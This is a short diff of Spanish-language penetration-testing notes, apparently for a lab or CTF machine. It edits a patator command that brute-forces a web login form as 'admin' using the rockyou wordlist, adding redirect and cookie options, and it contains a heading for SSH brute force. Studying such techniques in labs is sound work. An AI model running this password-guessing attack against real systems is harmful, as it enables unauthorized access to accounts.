@@ -2,7 +2,7 @@
 
 #### Fuerza Bruta a HTTP
 ```
-patator http_fuzz url="http//10.10.10.43/deparment/login.php" method=POST body='username=admin&password=FILE0' 0=/usr/share/wordlist/rockyou.txt -x ignore:fgrep="Invalid Password\!"
+patator http_fuzz url="http//10.10.10.43/deparment/login.php" method=POST body='username=admin&password=FILE0' 0=/usr/share/wordlist/rockyou.txt follow=1 accept_cookie=1 -x ignore:fgrep="Invalid Password\!"
 ```
 
 #### Fuerza Bruta a SSH
